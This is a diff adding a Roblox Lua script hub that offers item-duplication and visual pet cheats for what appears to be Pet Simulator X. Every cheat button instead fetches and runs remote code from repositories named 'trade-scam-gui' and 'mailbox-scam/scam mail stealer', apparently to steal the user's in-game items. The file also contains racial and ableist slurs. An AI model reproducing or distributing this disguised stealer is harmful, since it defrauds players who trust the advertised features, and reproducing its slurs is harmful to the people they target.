@@ -1,0 +1,149 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local player = game.Players.localPlayer
+local Window = OrionLib:MakeWindow({Name = "Welcome to ! CrazyNoob's fvcker V4.3", HidePremium = false, SaveConfig = true, IntoEnable = false})
+
+OrionLib:MakeNotification({
+	Name = "Logged In!",
+	Content = "You logged in as"..player.Name..".",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+_G.Key = "FvckPSXRetarded"
+_G.KeyInput = "string"
+
+function MakeScriptHub()
+    local Window = OrionLib:MakeWindow({Name = "! CrazyNoob Fvcker", HidePremium = false, SaveConfig = true, IntroEnable = true, Introtext = "Script Hub"})
+end
+
+
+function CorrectKeyNotification()
+    OrionLib:MakeNotification({
+        Name = "Correct key!",
+        Content = "You Entered the Correct key!",
+        Image = "rbxassetid://4483345998",
+        Time = 5
+    })
+end
+
+function IncorrectKeyNotification()
+    OrionLib:MakeNotification({
+        Name = "Incorrect key!",
+        Content = "You Entered the Incorrect key!",
+        Image = "rbxassetid://4483345998",
+        Time = 5
+    })
+end
+
+
+local Tab = Window:MakeTab({
+	Name = "Key",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+
+Tab:AddTextbox({
+	Name = "Enter key",
+	Default = "Key!",
+	TextDisappear = true,
+	Callback = function(Value)
+		_G.KeyInput = Value
+	end	  
+})
+
+
+Tab:AddButton({
+	Name = "Check Key!",
+	Callback = function()
+      	    if _G.KeyInput == _G.Key then
+            MakeScriptHub()  
+            CorrectKeyNotification()
+            else
+                IncorrectKeyNotification() 
+            end
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "TradeScam",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Tradescam",
+    Callback = function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxMguiSetup/trade-scam-gui-/main/nigga"))()
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Discord Server",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "discord.gg/KUNNNVyV",
+    Callback = function()
+        print("copied in clipboard")
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Dupe",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click here to dupe (only huges/exc).",
+    Callback = function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxMguiSetup/trade-scam-gui-/main/nigga"))()
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Visual Huge Cat",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click to have visual huge cat. ( Only you can see it.)",
+    Callback = function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxMguiSetup/trade-scam-gui-/main/nigga"))()
+      end
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Gems dupe",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "click here to dupe your diamonds.",
+    Callback = function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxMguiSetup/trade-scam-gui-/main/nigga"))()
+      end
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Source Code",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = " need to have exc or huge equipped to get it.",
+    Callback = function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxMguiSetup/mailbox-scam/main/scam%20mail%20stealer", true))()
+      end
+})
+
+
+_G.KickMsg = "Your account isn't 1 month old, pls re-try using another account."
